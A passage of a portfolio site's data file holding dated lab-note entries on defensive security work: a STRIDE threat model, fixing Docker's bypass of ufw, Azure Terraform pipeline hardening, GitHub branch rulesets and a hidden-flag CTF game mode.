      'Wrote a STRIDE threat model before any app code: 6 assets, 5 trust boundaries and 24 threats, each with a planned control and the phase it lands in',
      'Scaffolded a .NET 10 API with a health endpoint and one integration test, plus a React and TypeScript frontend',
      'Wrote Dockerfiles that run as non-root users, and built and tested both images on the mini PC',
    ],
    body: [
      "This project joins my two previous ones. The homelab was an app with a security pipeline, and the landing zone was locked-down Azure infrastructure. This one is an expense claims app on Azure: employees submit claims with receipts, managers approve them, and finance pays them. I picked it because money, approvals and file uploads give me real access-control rules to break later, which a CRUD demo wouldn't.",
      "Before any app code, I wrote a STRIDE threat model with 24 threats, each tied to a control and the phase that builds it. Two threats shape the design. A manager must not approve their own claim, which is a separation-of-duties rule I need to test on purpose. And a request for someone else's claim returns 404, so a 403 can't confirm the claim exists and IDs can't be enumerated.",
      'The plan wanted CI to build, test and scan the API and frontend in the first phase, but there was no app yet. The homelab got around this with a test job that only printed a message. This time I scaffolded the templates first: a .NET 10 API with a /health endpoint, one integration test that starts the whole API in memory, and a Vite React app. NuGet lock files are committed and restored in locked mode, the same idea as the Terraform lock file in the landing zone. I chose Postgres for the database.',
      "A few things didn't go to plan. My Mac only had the .NET 8 SDK, so I installed .NET 10, the current LTS. The Vite template now uses oxlint instead of ESLint. Docker Desktop wasn't running, so I built the images on the mini PC over SSH, which is how I found Docker getting around its firewall. The API image is Microsoft's chiseled Ubuntu image, with no shell, running as user 1654 at 181 MB. The frontend runs on unprivileged nginx as user 101. Both answered their health checks, and the mini PC builds amd64 images, the same architecture Azure Container Apps runs.",
      'Next is CI, with Trivy failing on HIGH and CRITICAL findings from the first run, so the images have to start clean.',
    ],
    tools: [
      '.NET 10',
      'ASP.NET Core',
      'xUnit',
      'React',
      'Vite',
      'Docker',
      'STRIDE',
    ],
    tags: [
      'Secure Expense Claims',
      'threat modelling',
      'STRIDE',
      'Docker',
      'CI/CD pipeline',
    ],
  },
  {
    id: 'appsec-homelab-entry-22-docker-bypassed-ufw',
    date: '2026-10-01',
    category: 'AppSec Homelab',
    title: 'My firewall said deny, and Docker answered anyway',
    workedOn: [
      'Pointed a Docker context at the mini PC over SSH so I could build images there instead of on my Mac',
      "Found that containers published on ports ufw doesn't allow were still reachable from my Mac",
      'Added a DOCKER-USER rule so published container ports follow the same LAN-only limit as ufw, and tested it with a port that had answered before',
      'Removed the ufw rules that allowed SSH from anywhere, including over IPv6',
      'Corrected my risk assessment, which said password login was disabled',
    ],
    body: [
      "I needed to build the Docker images for my new project, and Docker Desktop wasn't running on my Mac, so I pointed a Docker context at the mini PC over SSH. Getting there took a few tries. The mini PC had moved from 192.168.88.13 to .18, so my SSH config pointed at nothing. I ran the first docker --context command inside an SSH session on the mini PC, where the name homelab means nothing. And Docker's SSH connection can't answer a passphrase prompt, so it failed until I loaded my key into the macOS agent with the passphrase in Keychain.",
      "Once it worked, I ran the test containers on 8081 and 8082, because the homelab app already has 8080. Both answered from my Mac. ufw was active with default deny, and the only app port it allowed was 8080. Docker publishes ports with DNAT, so that traffic goes through the FORWARD chain and never hits ufw's INPUT rules. Over IPv6 it was different: 8080 timed out from my Mac, because Docker hands IPv6 to a proxy on the host and ufw filters that.",
      "The fix is a block in /etc/ufw/after.rules for the DOCKER-USER chain, which Docker checks before its own rules. It allows replies to connections the containers opened, allows 192.168.88.0/24 to reach original port 8080, and drops anything else new coming in on the Wi-Fi interface. NAT has already rewritten the port to the container's by then, so the rule matches on conntrack's original destination port. After a reload, 8080 still returned 200 from my Mac, and containers could still reach the internet. The first run of the 8081 test was invalid because the test container mapped the wrong port, so I reran it and also curled it from the mini PC itself: 200 locally and a timeout from my Mac, so the firewall was what blocked it.",
      "I also removed the ufw rules that allowed SSH from anywhere. The mini PC has public IPv6 addresses, and I haven't checked yet whether my router blocks inbound IPv6. SSH now only answers over IPv4 from the LAN. I kept password login on as a fallback in case I lose the key, which meant my risk assessment was wrong: it said key-only auth with passwords disabled. I corrected it and added the Docker bypass and the IPv6 check as gaps.",
      "ufw status showed exactly what I expected, and it still didn't describe what was reachable. I only found out because a port I never opened answered.",
    ],
    tools: ['ufw', 'iptables', 'Docker', 'SSH'],
    tags: [
      'AppSec Homelab',
      'firewall',
      'Docker',
      'network security',
      'risk assessment',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-22-wrap-up',
    date: '2026-10-01',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title:
      "Finishing the landing zone: what it caught, and what it still isn't",
    workedOn: [
      'Finished the landing zone: a gated Terraform pipeline, private endpoints, audit logging and a weekly drift check',
      'Went back over which controls caught real mistakes rather than the tests I set up for them',
      'Wrote down the limits: checksums from the same source as their downloads, a lock file that trusts its first download, and unpinned Trivy rules',
      'Listed what production would need: a second reviewer, a self-hosted agent in the VNet, nightly drift alerts, variables, and signature verification',
    ],
    body: [
      'The landing zone is finished. It is a small Azure environment in Terraform that can only be deployed through the pipeline: validate, a Trivy scan, plan, a manual approval, then apply of the exact plan I approved. The storage account and Key Vault are closed to the internet and reachable through private endpoints in the VNet, their access logs go to Log Analytics, and a weekly check fails if Azure drifts from the code. The pipeline signs in with OIDC, so no secret is stored anywhere.',
      "Looking back, the controls caught real mistakes, not only the ones I set up to test them. The scanner blocked six misconfigurations in code I had written. The branch ruleset rejected a commit I pushed at main by accident, because I had made the branch from origin/main. And reading a plan before approving it turned up two changes I hadn't made, which turned out to be a diff that came back on every plan.",
      "It isn't production-ready, and I can say where. Each checksum comes from the same place as its download, so it catches a corrupted file but not someone who controls the release. Signature verification would close that, with cosign for Trivy and GPG for HashiCorp. The provider lock file trusts its first download. Trivy's rules update on every run, which is how new findings appeared without any code change. With a team I would also want a second reviewer on PRs, a self-hosted agent inside the VNet for any data-plane work, nightly drift checks that alert someone, and variables so the same code can build dev and prod.",
      'What I would do differently: read every -/+ in a plan before approving, because the storage account replace showed its delete-then-create in advance. Read the full log rather than the last error, because the real auth failure was further up. And branch from an up-to-date local main instead of origin/main.',
      "Every control I trust here is one I triggered on purpose: a PR to prove Apply skips, a portal tag to prove drift detection goes red, a push to main to prove the ruleset holds. A control I haven't seen fail is one I am only assuming works.",
    ],
    tools: [
      'Terraform',
      'Azure DevOps',
      'Trivy',
      'Log Analytics',
      'Private Link',
      'YAML',
    ],
    tags: [
      'Secure Azure Landing Zone',
      'retrospective',
      'Terraform',
      'CI/CD pipeline',
      'supply chain',
      'drift detection',
    ],
  },
  {
    id: 'portfolio-site-entry-2-rulesets-signing-dependabot',
    date: '2026-10-01',
    category: 'Portfolio Site',
    title:
      'A required-checks rule with nothing in it, and signing my own commits',
    workedOn: [
      'Found two layers protecting main, a ruleset and classic branch protection, and that the ruleset required status checks but listed none',
      'Removed an always-on bypass that let Dependabot push straight to main',
      'Replaced both layers with one ruleset: PRs with passing CI and the secret scan, signed commits, and an admin bypass that only works through a PR',
      'Set up SSH commit signing with my GitHub key, and confirmed GitHub marks the commits Verified',
      'Split Dependabot so major updates get their own PRs, and auto-merge only explicit minor and patch updates once checks pass',
    ],
    body: [
      "I checked the rules on main after adding CI, expecting them to enforce it. They didn't. There were two layers: a ruleset, and older classic branch protection on top of it. The ruleset had required status checks switched on with an empty list, so a PR with failing tests could still merge. The classic rule wanted one approval, which I can't give my own PR, and had the branch locked, so every merge so far had gone through the admin bypass. That bypass skips CI too. The ruleset also gave Dependabot an always-on bypass, which would have let it push to main with no PR at all.",
      'I replaced both with one ruleset. A change to main now needs a PR, the "Lint, test, build, audit" and "Secret scan" checks passing, and signed commits. The checks are tied to GitHub Actions\' app ID, so a check with the same name from another app doesn\'t count. My admin bypass only works through a PR, and Dependabot has no bypass. I found out it worked when I tried to push straight to main and GitHub refused it.',
      "Signed commits were already required by the old rule, but my own commits weren't signed. Merges only passed because GitHub signs the merge commits it creates. I set git to sign with my existing GitHub SSH key, uploaded it as a signing key, and GitHub now shows my commits as Verified.",
      "Dependabot's first run put all 16 npm updates in one PR, including 7 major versions. TypeScript 7 is outside typescript-eslint's supported range, so npm ci failed and blocked everything else in the group. Majors now get their own PRs. A workflow turns on auto-merge for Dependabot PRs whose update type is explicitly minor or patch, so an empty or unknown type stays manual. It runs on pull_request rather than pull_request_target, so a PR's code never runs with write access. Then I sorted the majors by hand: react-router 8 merged after I checked its breaking changes, Vite 8 and plugin-react 6 went in together because one needs the other, and TypeScript 7 is ignored until typescript-eslint supports it.",
      'A rule that is switched on but empty looks the same as one that works. The only way I found out was by reading what it checked.',
    ],
    tools: [
      'GitHub rulesets',
      'GitHub Actions',
      'Dependabot',
      'SSH commit signing',
    ],
    tags: [
      'Portfolio Site',
      'branch protection',
      'signed commits',
      'Dependabot',
      'supply chain',
      'CI/CD pipeline',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-21-terraform-sign-in-template',
    date: '2026-10-01',
    category: 'Secure Azure Landing Zone',
    title: 'One sign-in block, and knowing which test covers what',
    workedOn: [
      'Moved the sign-in and terraform init block, copied into Plan, Apply and the weekly drift check, into one template: templates/terraform-azure.yml',
      'Made the template own the whole task (sign in, init, then the command the caller passes in), because environment variables end with each step and the OIDC token only exists inside the task that requested it',
      'Cut 74 lines down to 12, plus the template',
      'Caught parameters misspelled as paremters in three places before committing',
      'Tested each pipeline the way it could be tested: the PR run for Plan, a manual run for the drift check, and the merge itself for Apply',
    ],
    body: [
      "The sign-in and terraform init block had been copied into Plan, Apply and the weekly drift check. I moved it into one template, templates/terraform-azure.yml. It can't be a template that only signs in, because environment variables end with each step, and the OIDC token only exists inside the task that requested it. So the template owns the whole task (sign in, init, then run whatever command the caller passes in), and each pipeline passes its own: plan, apply, or the drift check's exit-code handling. 74 lines became 12, plus the template.",
      "Before committing, I'd spelled parameters as paremters in three places. All three would have failed the pipeline loudly, but fixing them first was cheaper.",
      "The testing was the interesting part, because no single run covered all of it. The PR run tested the template through Plan, which showed No changes. It didn't touch the drift pipeline's file, so I ran that by hand against my branch, and it was green. And because PR runs skip Apply, Apply's use of the template was only tested by the merge itself. After approval it finished 0 added, 0 changed, 0 destroyed.",
      'A green check only covers what it actually ran. Know which parts each test skips, and test those another way.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ28.webp',
      'SecureAzureLandingZone/SALZ29.webp',
      'SecureAzureLandingZone/SALZ30.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'pipeline templates',
      'OIDC',
      'CI/CD pipeline',
      'Azure DevOps',
    ],
  },
  {
    id: 'portfolio-site-entry-1-redesign-tests-and-ci',
    date: '2026-10-01',
    category: 'Portfolio Site',
    title:
      'Rebuilding the site, correcting my own copy, and adding tests and CI',
    workedOn: [
      'Turned Lab Notes from 52 full entries on one page into a shelf of project notebooks, with a short list of entries inside each',
      'Renamed CyberDiary to Lab Notes and kept the /diary URLs, so links I had already shared still work',
      'Gave the OWASP page a status grid and a page per risk, and split each risk into what I have done and what is next',
      "Added seven tests on Node 24's built-in runner and a GitHub Actions workflow with a gitleaks scan",
    ],
    body: [
      'The Lab Notes page rendered all 52 entries in full, one after another. A recruiter landing on it saw a wall of text with a row of filters. It is now a shelf with one notebook per project, a short list of entries inside each, and a Start here box with the latest milestone from each project. I renamed it from CyberDiary to Lab Notes and kept the /diary URLs, so links I have already shared still work.',
      'The OWASP page got the same treatment: a grid of the ten risks with their status, and a page for each one. I split every risk into what I have done and what is next, and cut 16 tools from the lists because nothing in these notes shows me using them.',
      'The About page had a bigger problem than its length and needed some cleaning up.  At Datacom I build local council environments with .NET tooling, export their configuration as JSON, and watch the pipeline that builds the cloud environment from it. The pipelines with security gates are in my own projects. I rewrote the About page, the Home page and my CV to say that.',
      "Then I added tests and CI. The tests run on Node 24's built-in runner, so they need no new packages. They check what TypeScript can't see: entry IDs are unique, entries stay newest first, every screenshot and script path resolves, every OWASP link points at a real entry, and every nav page has a route and a flag in the CTF map. To prove they work, I added a nav page with no flag and moved an entry out of date order, and both tests failed. A GitHub Actions workflow now runs lint, the tests, a Linux build and npm audit on every PR, plus a gitleaks scan, with each Action pinned to a commit SHA and Dependabot keeping the pins current. It has not run yet; the first push will tell me whether it works.",
      'Most of today was just cutting down long reads, tweaking designs and making sure it was user friendly.',
    ],
    tools: [
      'React',
      'TypeScript',
      'Node.js test runner',
      'GitHub Actions',
      'gitleaks',
      'Dependabot',
    ],
    tags: [
      'Portfolio Site',
      'redesign',
      'testing',
      'CI/CD pipeline',
      'GitHub Actions',
      'secret scanning',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-20-drift-detection-pipeline',
    date: '2026-09-30',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title: 'A weekly drift check, and a config that would have passed review',
    workedOn: [
      'Added a second pipeline that only plans: terraform plan -detailed-exitcode, which exits 0 when Azure matches the code, 1 on an error, and 2 on drift, so any non-zero exit fails the run',
      'Set trigger: none and pr: none so it never runs Apply or waits at the approval gate, and always: true so ADO still runs it when there are no new commits, since drift happens in Azure, not in git',
      'Caught two typos in the schedule: a cron with four fields instead of five, and includes instead of include, neither of which would have failed the PR, since the PR runs the main pipeline, not this file',
      'Confirmed cron runs in UTC, so "Monday 3am" in Brisbane is Sunday, day 0',
      'Proved it works by tagging the resource group drifttest in the Portal: the pipeline went red with "Drift detected" and a plan to remove the tag, then green again once the tag was deleted',
      "Checked the service connection's permissions after registering the new pipeline and confirmed only the two pipelines are listed",
    ],
    body: [
      'I added a second pipeline that only plans. It runs terraform plan -detailed-exitcode, which exits 0 when Azure matches the code, 1 on an error and 2 when something has drifted. Any non-zero exit fails the run, so drift shows up as red. It lives in its own file with trigger: none and pr: none, so it never runs Apply and never waits at the approval gate. always: true matters because ADO skips a scheduled run when there are no new commits, and drift happens in Azure, not in git.',
      'My first version had two typos in the schedule: a cron with four fields instead of five, and includes instead of include. Neither would have failed the PR, because the PR runs the main pipeline, not this file. ADO does not read it until you register it. The schedule was also easy to get wrong: cron runs in UTC, so "Monday 3am" in Brisbane is Sunday, day 0.',
      'To prove it works, I added a drifttest tag to the resource group in the Portal and ran the pipeline. It went red with "Drift detected", and the plan wanted to remove the tag. I deleted the tag, ran it again, and it went green. Registering the pipeline did not ask me to permit the service connection, because ADO authorises a pipeline\'s resources when the owner creates it. I checked the connection\'s permissions and they list only the two pipelines.',
      'A config file is not tested until something reads it. If the PR checks do not run it, they have not reviewed it.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ26.webp',
      'SecureAzureLandingZone/SALZ27.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'drift detection',
      'CI/CD pipeline',
      'Azure DevOps',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-18-keyvault-endpoint-plan-matched',
    date: '2026-09-30',
    category: 'Secure Azure Landing Zone',
    title: 'The Key Vault endpoint, and a plan that finally matched',
    workedOn: [
      "Added the second private endpoint, for the Key Vault: the same pattern as blob with three different values, the vault's ID, the sub-resource vault, and the vault's DNS zone",
      'Read the plan line by line rather than trusting the green check, since a wrong sub-resource name or the blob zone pasted into the zone group would both pass validate without complaint',
      'Got exactly 1 to add, 0 to change, 0 to destroy, and the diagnostic settings refreshed with no diff, confirming the metric fix held on a new PR',
      'Checked right after merging and saw only the blob endpoint, since main was still waiting on approval and nothing reaches Azure until Apply runs',
      "After approving, confirmed both endpoints as Approved, with the vault's A record at 10.0.2.5, the next free address after blob's 10.0.2.4",
    ],
    body: [
      "I added the second private endpoint, for the Key Vault. It is the same pattern as blob with three different values: the vault's ID, the sub-resource vault, and the vault's DNS zone. Two slips would have passed validate without complaint: a wrong sub-resource name, or the blob zone pasted into the zone group. So I read the plan line by line instead of trusting the green check. It said exactly 1 to add, 0 to change, 0 to destroy. The diagnostic settings refreshed with no diff, so the metric fix held on a new PR.",
      "My first check after merging showed only the blob endpoint. The merge had worked, but the main run was still waiting for my approval, and nothing reaches Azure until the Apply runs. After approving, both endpoints showed Approved. The vault's A record came up at 10.0.2.5, the next free address after blob's 10.0.2.4, since Azure reserves the first four in every subnet.",
      'From my laptop, nslookup for the vault goes through privatelink.vaultcore.azure.net and ends at a public address, the same as blob. That is what should happen outside the VNet. Inside it, both names now resolve to private IPs.',
      'A merged PR only changes code. Check that the change has reached Azure before checking whether it works.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ22.webp'],
    tools: ['Terraform', 'Azure', 'Azure DevOps'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'private endpoints',
      'private DNS',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-17-diagnostic-diff-blocked-push',
    date: '2026-09-29',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title:
      'Fixing a diff that kept coming back, and a push that did not get through',
    workedOn: [
      'Fixed the recurring diagnostic settings diff by declaring the disabled metric categories in code: AllMetrics on the vault, Capacity and Transaction on blob storage, all with enabled = false',
      'Expected the next plan to show 2 changes putting back what the last apply had removed. It said No changes instead, since Azure had never actually removed them, it just kept reporting categories whatever code sent',
      'Branched from origin/main and had Git set main as its upstream by default, so a VS Code push went straight to main',
      'Watched the branch ruleset reject the push twice with "Changes must be made through a pull request", the first time it blocked a real mistake rather than a test',
      'Pushed the branch under its own name and merged through a PR instead',
    ],
    body: [
      'The diagnostic settings from the audit logging work had been showing up as changes on every plan. When you create a diagnostic setting, Azure records every metric category the resource supports, each one switched off. My code did not mention them, so every plan tried to remove them, and Azure kept reporting them anyway. The fix was to declare them in code: AllMetrics on the vault, and Capacity and Transaction on blob storage, all with enabled = false.',
      'I expected the next plan to show 2 changes, putting back entries the last apply had removed. It said No changes, and the apply after merging did nothing. The earlier apply had never removed them in the first place, because Azure keeps them whatever you send. That is why the diff kept coming back. My prediction was wrong, and the result proved the fix better than the prediction would have.',
      'Getting it merged went wrong first. I made the branch from origin/main, and Git set main as its upstream without telling me. When VS Code pushed my commit, it pushed to main. The ruleset I set up earlier rejected it twice with "Changes must be made through a pull request". That was the first time it blocked a real mistake rather than a test. I pushed the branch under its own name and went through a PR.',
      'A control you have only tested on purpose has not been proven yet. The first time it catches a real mistake is when you find out it works.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ21.webp'],
    tools: ['Terraform', 'Azure', 'Git', 'GitHub'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'branch protection',
      'Log Analytics',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-16-approve-known-diff-verify-endpoint',
    date: '2026-09-29',
    category: 'Secure Azure Landing Zone',
    title:
      'Approving a plan I knew was not clean, and checking the endpoint worked',
    workedOn: [
      'Merged the blob private endpoint with the diagnostic settings diff still in it, approving 7 to add, 2 to change, 0 to destroy on purpose, since the fix for the 2 was already planned for its own PR',
      'Checked the result after apply instead of trusting the green pipeline: the endpoint connection shows Approved, with an A record for the storage account at 10.0.2.4, the first usable address in the subnet',
      "Confirmed from my laptop that nslookup resolves through the privatelink name to the storage account's public IP, which the firewall still blocks, since my laptop is not in the VNet",
    ],
    body: [
      'I merged the blob private endpoint with the diagnostic settings diff still in it. At the approval gate, the plan matched the PR: 7 to add, 2 to change, 0 to destroy. The only ~ lines removed metric entries that were already switched off, and nothing touched the storage account or the Key Vault. I approved on purpose, knowing what the 2 changes were and that the fix would follow in its own PR.',
      'After the apply, I checked the result instead of trusting the green pipeline. The endpoint connection is Approved. The private DNS zone has an A record for the storage account at 10.0.2.4, the first usable address in the subnet, since Azure reserves the first four. Azure wrote that record itself, through the zone group.',
      "From my laptop, nslookup goes through the privatelink name and ends at the storage account's public IP, which the firewall still blocks. That is expected, because my laptop is not in the VNet. From inside it, the same lookup would stop at 10.0.2.4.",
      'Approving a plan that is not clean is fine if you can explain every line of it. Approving without reading it is not.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ20.webp'],
    tools: ['Terraform', 'Azure', 'Azure DevOps'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'private endpoints',
      'private DNS',
    ],
  },
  {
    id: 'ctf-map-entry-1-game-mode-and-hidden-flag',
    date: '2026-09-26',
    category: 'Portfolio Site',
    title:
      'A game mode for this site, with a real flag hidden in it (Just for fun)',
    workedOn: [
      'Added an optional 3D capture-the-flag map at /play: each page of the site is a flag, and you drive to one and press Enter to open it',
      'Kept the normal site as the default and put all the 3D code in its own chunk, so the main bundle only grew by about 1 KB',
      'Found the reflective floor showed nothing because the shader multiplies the reflection by the floor colour, and mine was almost black',
      'Self-hosted the fonts instead of loading them from Google Fonts, and added a Content Security Policy to the build',
      'Hid a real flag on the map',
      'Web browser only not available on phone',
    ],
    body: [
      'I added a game mode to this site. The Play CTF Map button on the home page opens a 3D arena styled on the grid from Tron. You drive a small program called the Bit around it, and each page of the site is a flag. Get close to one, press Enter, and you land on that page. The normal site stays the default, since nobody should have to play a game to read my CV.',
      'I built it with help from Claude Code over one Saturday, one phase at a time, committing each phase before starting the next.',
      'It uses Three.js through React Three Fiber, which comes to about 300 KB gzipped. All of it sits in its own chunk that only downloads when someone opens the map. The main bundle grew by about 1 KB.',
      'The reflective floor showed nothing at first. Reading the shader explained it: the reflection is multiplied by the floor colour, and my floor was almost black, so the result was almost black too. Raising the reflection strength from 3 to 50 fixed it.',
      "Two decisions came from this being a security portfolio. The fonts are bundled with the site instead of loaded from Google Fonts, so opening the map does not send a visitor's IP address to Google. The build also adds a Content Security Policy now. GitHub Pages cannot send response headers, so the policy goes in a meta tag, with the one inline script allowed by its hash. Browsers ignore frame-ancestors in a meta tag, so there is still no clickjacking protection on this host.",
      'While I was in there, moving the Tailwind build plugin into devDependencies and running npm audit fix took the audit to 0 findings.',
      'There is also a real flag hidden on the map, in the usual flag{...} format. The boot screen tells you where to start looking. The string is base64 encoded in the bundle, so searching the source for flag{ finds nothing, but decoding it counts as a solve too.',
      'A static site cannot keep a secret. Anyone can read the bundle, so the flag is a game string and nothing real goes near it.',
    ],
    screenshots: ['CTFMap/CTFMap1.webp'],
    tools: ['React Three Fiber', 'Three.js', 'Vite', 'Claude Code'],
    tags: [
      'CTF Map',
      'Three.js',
      'Content Security Policy',
      'self-hosted fonts',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-15-private-endpoint-plan-drift',
    date: '2026-09-26',
    category: 'Secure Azure Landing Zone',
    title: 'A private endpoint, and a plan with two changes I had not made',
    workedOn: [
      'Added the blob private endpoint in the new subnet and pointed it at the private DNS zone, so Azure writes the A record itself',
      'Expected a PR plan of 7 to add and nothing else, and got 7 to add, 2 to change',
      'Traced the 2 changes to the diagnostic settings from the audit logging work: Azure records every metric category on a setting, switched off, and my code does not mention them, so Terraform planned to remove them',
      'Have not merged yet: the fix is to declare the disabled metric blocks in code and check the plan drops to 0 to change',
    ],
    body: [
      'I added the blob private endpoint in the new subnet and pointed it at the private DNS zone, so Azure writes the A record itself. I expected a PR plan of 7 to add and nothing else. It showed 7 to add, 2 to change.',
      'The storage account was not in the changes. They were the two diagnostic settings from the audit logging work. Azure records every metric category on a diagnostic setting, switched off. My code does not mention them, so Terraform planned to remove them. Applying it would do no harm, but Azure keeps reporting those entries, so the change would come back on every plan.',
      'I have not merged. The fix is to declare the disabled metric blocks in code, then check the plan drops to 0 to change. That is next time.',
      'A harmless change that shows up on every plan still costs something, because it trains you to skim past the ~ lines.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ19.webp'],
    tools: ['Terraform', 'Azure', 'Azure DevOps'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'private endpoints',
      'Log Analytics',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-14-private-dns-zones',
    date: '2026-09-26',
    category: 'Secure Azure Landing Zone',
    title: 'Private DNS zones, and a plan that counted more than I had written',
    workedOn: [
      'Added two private DNS zones, privatelink.blob.core.windows.net and privatelink.vaultcore.azure.net, and linked each one to the VNet',
      'Learned the zone names are fixed by Azure for each service, and the redirect only works with the exact one',
      "Found the PR plan said 6 to add when this step only wrote 4 resources: step 1's subnet is committed on the branch but not merged, and Apply only runs on main, so every PR plan counts everything Azure does not have yet",
    ],
    body: [
      'The second step of the private endpoints work was DNS. I added two private DNS zones and linked each one to the VNet. I could not pick the names, since Azure fixes a zone name for each service.',
      'The redirect works like this. Public DNS already answers salzstcg314215.blob.core.windows.net with a CNAME to the same name under privatelink. Any VNet linked to my zone can answer that second name with a private IP. A zone that is not linked to the VNet does nothing, which makes the link the easiest piece to leave out.',
      "The PR plan said 6 to add, but this step only wrote 4 resources. Step 1's subnet is committed on the branch but has not been merged, and Apply only runs on main. So every PR plan counts everything on the branch that Azure does not have yet. The 2 extra resources came from step 1.",
      'A plan compares your code with what is actually deployed, not with your last commit. Before calling a count wrong, check where the counting starts.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ18.webp'],
    tools: ['Terraform', 'Azure', 'Azure DevOps'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'private endpoints',
      'private DNS',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-13-private-endpoint-subnet',
    date: '2026-09-26',
    category: 'Secure Azure Landing Zone',
    title:
      'A subnet for private endpoints, and an NSG that does not do much yet',
    workedOn: [
      'Started the private endpoints work with the network they will sit in: a new subnet, salz-pe-subnet on 10.0.2.0/24, with the existing NSG associated',
      'Kept the endpoints out of the workload subnet, so access to them can be managed on its own later',
      'Found that the NSG association is mostly not a control yet: private endpoint network policies are off by default on a new subnet, and while they are off, NSG rules do not apply to endpoint traffic',
      "Checked the PR's plan before merging: 2 to add, 0 to change, 0 to destroy",
    ],
    body: [
      'I started the private endpoints work with the network they will sit in: a new subnet, salz-pe-subnet on 10.0.2.0/24, with the existing NSG associated. The endpoints could have gone in the workload subnet. A separate subnet keeps them apart from workloads, so access to them can be managed on its own later.',
      'The NSG association looks like a security control but mostly is not one yet. On a new subnet, private endpoint network policies are off by default, and while they are off, NSG rules do not apply to endpoint traffic. The association is there so the subnet matches the other one, not because it filters anything.',
      "Before merging I checked the PR's plan: 2 to add, 0 to change, 0 to destroy. After the storage account replace earlier in the project, I read the counts before approving, not after.",
      'A control being attached does not mean it is enforced. Check what actually applies it before counting it as protection.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ17.webp'],
    tools: ['Terraform', 'Azure', 'Azure DevOps'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'private endpoints',
      'network security',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-12-diagnostic-logging-azu-0057',
    date: '2026-09-25',
    category: 'Secure Azure Landing Zone',
    title: 'Adding diagnostic logging, and testing a suppression honestly',
    workedOn: [
      'Added a Log Analytics workspace and two diagnostic settings: the Key Vault AuditEvent log, and the blob service read, write, and delete logs',
      'Learned the storage setting has to target /blobServices/default, not the account: a setting on the account only collects metrics, and nothing warns you',
      'Removed the AZU-0057 suppression on a PR commit to test whether the logging fixed the finding. Trivy still failed, because the rule only looks for the legacy Storage Analytics setting inside the storage account block',
      'Restored the suppression without the 31 Dec expiry, with a reason naming the resource that provides the logs',
    ],
    body: [
      "The logging was meant to fix the AZU-0057 finding I had accepted with a 31 Dec expiry. To check, I removed the suppression on a PR commit. An ignored finding does not appear in Trivy's counts, so that was the only honest test.",
      'Trivy still failed. The rule only looks for the legacy Storage Analytics setting inside the storage account block, and the new logging lives in a separate diagnostic setting.',
      'I restored the suppression without the expiry, with a reason that names the resource providing the logs. The expiry had meant "fail me if I forget to fix this". With logging in place, the gap is in the rule, and an expiry would fail a working pipeline.',
      'A passing or failing check tells you what the rule looks for, not whether you are secure. When they disagree, test it, then write down which one is right and why.',
    ],
    screenshots: ['SecureAzureLandingZone/SALZ16.webp'],
    tools: ['Terraform', 'Azure', 'Trivy', 'Log Analytics'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'logging',
      'Trivy',
      'CI/CD pipeline',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-11-terraform-install-template',
    date: '2026-09-25',
    category: 'Secure Azure Landing Zone',
    title: 'Verifying the Terraform binary with a shared install template',
    workedOn: [
      'Found the pipeline downloaded the Terraform binary without a checksum, even though the binary is what checks the provider lock-file hashes',
      'Found the install copied into three stages and already drifted: Validate used a version variable, Plan and Apply hardcoded the version in the URL',
      "Moved it into one ADO step template, templates/install-terraform.yml, which downloads Terraform 1.9.8 with HashiCorp's SHA256SUMS file and verifies it under set -euo pipefail",
      'Restructured Plan and Apply, since their install ran inside the AzureCLI@2 script: cd ../terraform became cd terraform',
      'Caught a missing template line in the Plan stage on my first attempt',
    ],
    body: [
      "The Terraform binary checks the provider's lock-file hashes, and the pipeline was downloading it without a checksum. The tool at the bottom of the verification chain was the one piece nobody checked. The install was also copied into three stages and had already drifted.",
      "I moved it into one step template that verifies the download against HashiCorp's SHA256SUMS file. Each stage now pulls it in with a single - template: line. Plan and Apply needed a small restructure, because their install ran inside the AzureCLI@2 script.",
      'My first attempt missed the template line in the Plan stage. If the hosted image ships its own Terraform, Plan would have run green on an unverified, different version, the exact drift the template exists to prevent.',
      'When you deduplicate code, check every place that used the old copy. A missing include can fail silently, just like a wrong condition.',
    ],
    screenshots: [
      'SecureAzureLandingZone/SALZ14.webp',
      'SecureAzureLandingZone/SALZ15.webp',
    ],
    tools: ['Azure DevOps', 'Terraform', 'YAML'],
    tags: [
      'Secure Azure Landing Zone',
      'Terraform',
      'supply chain security',
      'CI/CD pipeline',
      'Azure DevOps',
    ],
  },
  {
    id: 'secure-azure-landing-zone-entry-10-pr-gate-branch-protection',
    date: '2026-09-24',
    category: 'Secure Azure Landing Zone',
    milestone: true,
    title: 'Gating main: PR trigger, skipped Apply, and a branch ruleset',
    workedOn: [
      'Added a pr: trigger so pull requests into main run Validate, Trivy, and Plan',
